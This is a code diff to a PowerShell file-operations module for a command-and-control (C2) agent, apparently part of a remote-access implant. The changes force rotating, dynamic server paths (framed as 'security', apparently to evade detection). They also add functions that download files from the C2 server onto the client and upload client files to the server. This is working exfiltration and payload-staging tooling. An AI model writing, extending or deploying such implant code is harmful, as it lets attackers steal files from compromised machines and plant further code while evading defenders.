@@ -160,22 +160,19 @@ function Download-FileFromServer {
         # Create a web client for file request
         $webClient = New-ConfiguredWebClient
         
-        # Get current file request path based on rotation status
-        $fileRequestPath = if ($global:pathRotationEnabled) { 
-            $path = Get-CurrentPath -PathType "file_request_path"
-            Write-Host "Using rotated file request path: $path"
-            $path
-        } else { 
-            # If path rotation is disabled, use the initial path from initialization
-            $path = $global:initialPaths["file_request_path"]
-            Write-Host "Using static file request path: $path"
-            $path  # Use path from initialPaths instead of hardcoded value
+        # Get current file request path directly from path manager
+        # CRITICAL CHANGE: Removed fallback to static paths
+        if ($global:pathRotationEnabled) {
+            $fileRequestPath = Get-CurrentPath -PathType "file_request_path"
+            Write-Host "Using rotated file request path: $fileRequestPath"
+        } else {
+            $fileRequestPath = $global:initialPaths["file_request_path"]
+            Write-Host "Using initial file request path: $fileRequestPath"
         }
         
-        # If still no path, set a reasonable default but log a warning
-        if (-not $fileRequestPath) {
-            Write-Host "WARNING: No file_request_path found. Using fallback path '/file_request'"
-            $fileRequestPath = "/file_request"
+        # Throw error if we don't have a path - force using dynamic paths
+        if ([string]::IsNullOrEmpty($fileRequestPath)) {
+            throw "ERROR: No dynamic file_request_path found. Agent must use dynamic paths for security."
         }
         
         # Encrypt the request
@@ -352,22 +349,18 @@ function Upload-FileToServer {
         # Create a web client for file upload
         $webClient = New-ConfiguredWebClient
         
-        # Get current file upload path based on rotation status
-        $fileUploadPath = if ($global:pathRotationEnabled) { 
-            $path = Get-CurrentPath -PathType "file_upload_path" 
-            Write-Host "Using rotated file upload path: $path"
-            $path
-        } else { 
-            # Use the initial path from global variables instead of hardcoded fallback
-            $path = $global:initialPaths["file_upload_path"]
-            Write-Host "Using static file upload path: $path"
-            $path  # Use path from initialPaths instead of hardcoded value
+        # Get current file upload path - CRITICAL CHANGE: Removed fallback to static paths
+        if ($global:pathRotationEnabled) {
+            $fileUploadPath = Get-CurrentPath -PathType "file_upload_path"
+            Write-Host "Using rotated file upload path: $fileUploadPath"
+        } else {
+            $fileUploadPath = $global:initialPaths["file_upload_path"]
+            Write-Host "Using initial file upload path: $fileUploadPath"
         }
         
-        # If still no path, set a reasonable default but log a warning
-        if (-not $fileUploadPath) {
-            Write-Host "WARNING: No file_upload_path found. Using fallback path '/file_upload'"
-            $fileUploadPath = "/file_upload"
+        # Throw error if we don't have a path - force using dynamic paths
+        if ([string]::IsNullOrEmpty($fileUploadPath)) {
+            throw "ERROR: No dynamic file_upload_path found. Agent must use dynamic paths for security."
         }
         
         # Prepare the payload
@@ -551,12 +544,57 @@ function Get-DriveInfo {
     }
 }
 
-# Create backwards-compatible aliases that match the old terminology
-# This maintains compatibility with existing C2 server commands and scripts
-New-Alias -Name Download-File -Value Upload-FileToServer
-New-Alias -Name Upload-File -Value Download-FileFromServer
+# Create the file operations functions directly - not just as aliases
+# This addresses the "command not found" issue when the agent tries to use the alias
 
-# Export both the new functions and the aliases for use in the agent
+function Upload-File {
+    <#
+    .SYNOPSIS
+        Gets a file from server to client - alias for backward compatibility
+    .DESCRIPTION
+        Downloads a file from the C2 server and saves it to the specified path on the client
+    .PARAMETER SourcePath
+        Path to the file on the server
+    .PARAMETER DestinationPath
+        Path where the file should be saved on the client
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$SourcePath,
+        
+        [Parameter(Mandatory=$true)]
+        [string]$DestinationPath
+    )
+    
+    # Simply call the main function
+    return Download-FileFromServer -SourcePath $SourcePath -DestinationPath $DestinationPath
+}
+
+function Download-File {
+    <#
+    .SYNOPSIS
+        Sends a file from client to server - alias for backward compatibility
+    .DESCRIPTION
+        Uploads a file from the client to the C2 server
+    .PARAMETER FilePath
+        Path to the file on the client to upload
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$FilePath
+    )
+    
+    # Simply call the main function
+    return Upload-FileToServer -FilePath $FilePath
+}
+
+# Also create the aliases for backwards compatibility
+New-Alias -Name "Upload-File" -Value "Download-FileFromServer" -Force -Scope Global
+New-Alias -Name "Download-File" -Value "Upload-FileToServer" -Force -Scope Global
+
+# Export both the functions and the aliases for use in the agent
 Export-ModuleMember -Function Get-DirectoryListing, Upload-FileToServer, Download-FileFromServer, 
-                             Get-FileSystemItems, Get-DriveInfo, 
-                             Get-FileOwner -Alias Download-File, Upload-File
+                             Get-FileSystemItems, Get-DriveInfo, Get-FileOwner,
+                             Upload-File, Download-File -Alias Upload-File, Download-File
